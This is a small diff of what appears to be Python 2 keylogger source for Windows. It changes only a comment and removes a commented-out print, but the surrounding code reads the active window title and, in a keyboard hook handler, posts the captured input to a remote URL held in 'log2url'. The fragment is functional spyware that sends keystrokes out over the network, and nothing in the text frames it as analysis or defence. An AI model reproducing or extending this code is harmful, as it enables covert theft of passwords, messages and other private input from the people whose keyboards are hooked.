@@ -39,7 +39,7 @@ def getWindowTitle():
 	title = create_string_buffer("\x00" * 512)
 	length = user32.GetWindowTextA(hwnd, byref(title),512)
 	
-	# Log title name above text input
+	# Display title in console
 	print "\n\n[ %s ]\n" % ( title.value)
 	
 	# Close
@@ -107,7 +107,6 @@ def KeyIN(event):
 	req = urllib2.Request(log2url, data)
 	response = urllib2.urlopen(req)
 	the_page = response.read()
-	#print the_page
 
 	# Return to hook
 	return True
